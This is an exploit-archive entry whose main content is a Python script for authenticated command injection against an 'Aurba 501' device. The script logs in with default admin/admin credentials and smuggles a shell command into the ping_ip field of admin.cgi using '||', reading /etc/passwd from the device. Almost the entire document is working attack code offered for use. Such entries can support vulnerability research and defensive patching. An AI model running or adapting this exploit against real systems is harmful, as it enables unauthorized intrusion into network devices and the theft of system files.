@@ -1,0 +1,97 @@
+id: 39732
+date: 08/27/2024
+title: Aurba 501 - Authenticated Remote Code Execution Exploit
+author: Hosein Vita
+cves: 
+
+# Exploit Title: Remote Command Execution | Aurba 501
+# Exploit Author: Hosein Vita
+# Vendor Homepage: https://www.hpe.com
+# Version: Aurba 501 CN12G5W0XX
+# Tested on: Linux
+
+import requests
+from requests.auth import HTTPBasicAuth
+
+
+def get_input(prompt, default_value):
+    user_input = input(prompt)
+    return user_input if user_input else default_value
+
+
+base_url = input("Enter the base URL: ")
+if not base_url:
+    print("Base URL is required.")
+    exit(1)
+
+username = get_input("Enter the username (default: admin): ", "admin")
+password = get_input("Enter the password (default: admin): ", "admin")
+
+
+login_url = f"{base_url}/login.cgi"
+login_payload = {
+    "username": username,
+    "password": password,
+    "login": "Login"
+}
+
+
+login_headers = {
+    "Accept-Encoding": "gzip, deflate, br",
+    "Content-Type": "application/x-www-form-urlencoded",
+    "Origin": base_url,
+    "Connection": "close"
+}
+
+session = requests.Session()
+
+
+requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)
+
+# Login to the system
+response = session.post(login_url, headers=login_headers, data=login_payload, verify=False)
+
+# Check if login was successful
+if response.status_code == 200 and "login failed" not in response.text.lower():
+    print("Login successful!")
+    
+    # The command to be executed on the device
+    command = "cat /etc/passwd"
+    
+    
+    ping_ip = f"4.2.2.4||{command}"
+    
+    # Data to be sent in the POST request
+    data = {
+        "ping_ip": ping_ip,
+        "ping_timeout": "1",
+        "textareai": "",
+        "ping_start": "Ping"
+    }
+    
+    # Headers to be sent with the request
+    headers = {
+        "Accept-Encoding": "gzip, deflate, br",
+        "Content-Type": "application/x-www-form-urlencoded",
+        "Origin": base_url,
+        "Referer": f"{base_url}/admin.cgi?action=ping",
+        "Connection": "close"
+    }
+    
+    # Sending the HTTP POST request to exploit the vulnerability
+    exploit_url = f"{base_url}/admin.cgi?action=ping"
+    response = session.post(exploit_url, headers=headers, data=data, verify=False)
+    
+    
+    if any("root" in value for value in response.headers.values()):
+        print("Exploit successful! The /etc/passwd file contents are reflected in the headers:")
+        print(response.headers)
+    else:
+        print("Exploit failed. The response headers did not contain the expected output.")
+else:
+    print("Login failed. Please check the credentials and try again.")
+
+# Print the response headers for further analysis
+print(response.headers)
+
+#  0day.today [2024-08-28]  #
